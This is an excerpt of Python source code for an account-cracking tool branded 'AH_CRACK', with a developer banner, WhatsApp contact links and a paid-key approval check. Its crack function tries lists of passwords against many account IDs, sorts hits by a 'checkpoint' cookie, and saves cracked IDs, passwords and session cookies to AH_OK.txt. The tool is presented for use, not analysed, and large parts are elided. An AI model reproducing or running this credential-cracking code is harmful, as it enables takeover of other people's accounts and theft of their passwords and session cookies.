...
def banner():
	print('\x1b[1;92m\n	 \t\x1b[1;91m █████╗ ██████╗ ██╗██╗   ██╗ █████╗ ███╗   ██╗\n	 \t\x1b[1;90m██╔══██╗██╔══██╗██║╚██╗ ██╔╝██╔══██╗████╗  ██║\n	 \t\x1b[1;93m██████║██████╔╝██║ ╚████╔╝ ███████║██╔██╗ ██║\n	 \t\x1b[1;94m██╔══██║██╔══██╗██║  ╚██╔╝  ██╔══██║██║╚██╗██║║\n	 \t\x1b[1;97m██║  ██║██║  ██║██║   ██║   ██║  ██║██║ ╚████║\n	 \t\x1b[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝\n\n ┌──────────────────────────────────────────────────────┐\n │[✓] DEVOLPER   :			ABUBOCKOR ARIYAN [AH]	  │\n │[✓] WHATSAPP   :			+8801902585763			│\n │[✓] GITHUB	 :			ARIYAH-AMHED404		   │\n │[✓] TOOLS	  :			AHA-FILE-CLONING		  │\n │[✓] TEAM	   :			AHA					   │\n └──────────────────────────────────────────────────────┘\n	\n	\t \x1b[47m\x1b[1;31mTHE TOOL WILL BE UPDATED EVERY SEVEN DAYS\x1b[40m\x1b[00m\n		   ')
...
def notice():
	...
	print('\x1b[0;92mADMIN WHATSAPP\x1aAH_ARIYAN')
	time.sleep(2)
	os.system('am start https://wa.me/+8801902585763')
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/ariyanamhed404/Ariyan-approval.txt/tree/main').text
			if basesplit in plr:
				key = basesplit
				stat = '\x1b[0;92mPAID'
				FY = '\x1b[0;93m'
		...
		if _____cowok__pink_____ in ('1',):
			if basesplit in plr:
				...
				os.system('am start https://wa.me/+8801706200853')
			elif basesplit in ('3',):
				print('=>EXIT DONE ')
				exit()
			else:
...
def crack(idf, pwv):
	...
	(sys.stdout.write(f"\r{b}AH_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mAH_CP🥀')
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mAH_OK💚')
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('AH_OK.txt', 'a').write(idf + '|' + pw + kuki + '\n')
